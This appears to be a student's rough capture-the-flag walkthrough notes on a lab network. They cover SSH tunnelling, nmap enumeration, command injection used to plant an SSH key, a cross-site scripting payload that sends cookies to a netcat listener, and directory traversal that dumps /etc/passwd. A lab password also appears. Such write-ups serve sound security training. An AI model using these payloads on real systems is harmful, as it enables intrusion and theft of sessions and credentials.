### Start of day2 CTF's
```bash
#IP TARGET: 10.100.28.40
#to begin, I ran:
student@lin-ops$ ssh -MS /tmp/jump student@10.50.11.132
PASS: meeMd337xc6j
#Then:
student@lin-ops$ ssh -S /tmp/jump jump -O forward -D9050
student@lin-ops$ nmap 10.100.28.40
#Result:
Nmap scan report for 10.100.28.40
Host is up (0.00090s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http #CONFIRMED HTTP
4444/tcp open  krb524 #CONFIRMED SSH
#Next,
student@lin-ops$ ssh -S /tmp/jump jump -O forward -L11111:10.100.28.40:80 -L11112:10.100.28.40:4444
#In firefox:
127.0.0.1:1111 #Brought us to webpage for MI, not of very much use.
student@lin-ops$ proxychains nmap --script=http-enum 10.100.28.40
 PORT     STATE SERVICE
80/tcp   open  http
| http-enum: 
|   /robots.txt: Robots file
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
4444/tcp open  krb524
#Robots.txt:
User-agent: *
Disallow: /net_test

#On uploads, I discovered the IP 10.100.28.55
#Discovered in robots.txt "net_test", which led to a trouble ticket link, which led to the finding of "Contract_bids.html, which putting that in led me to find "N.Romanoff@MI.ru
###C OMMAND INJECTION
#We went to the net_test and looked at the send boxes. I selected the second one, and ran
../../../../../../ cat /etc/passwd
#No result
#Ran:
;  cat /etc/passwd
#Revealed Billybob.
student@lin-ops$ cat ~/.ssh/id_rsa.pub
On website**
 ls -la /users/home/directory      #check if .ssh exists
 mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exist
echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
cat /users/home/directory/.ssh/authorized_keys (Verify)
using our ssh port forward we created earlier*
#ssh billybob@127.0.0.1 -p 11112
billybob@mi$ cd /home
#we did dir, revealed romanoff@mi.ru, cd there, cat contracts, flag revealed.
#For cross-site scripting*
#Went to a single shell, input
nc -lvnkp 4444
#We went to the trouble tickets, and submitted
<script>document.location="http://10.50.153.201:4444/?username=" + document.cookie;</script>
#Waited.
#We got it.
#Create a tunnel.
ssh billybob@127.0.0.1 -p 11112 -L21111:10.100.28.55.80
#Go to website
127.0.0.1:21111
Do the thing. Once you come across password one, we looked at source code. i wanted to select "win_the-game" because it looked important.
win_the_game()
#flag appeared.
#Next, I went to next pages. The buttons on the page would read things out, meaning that cat was in use. I selected the first click down, amd emtered in the url AFTER the =
http://127.0.0.1:21111/books_pick.php?book=../../../../../../etc/passwd
#Etc passwd was revealed.
#root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync #games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin #news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin #backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System
#(admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-#resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin #_apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin #landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash #KOEXkOEl1r9yMItQYc2a
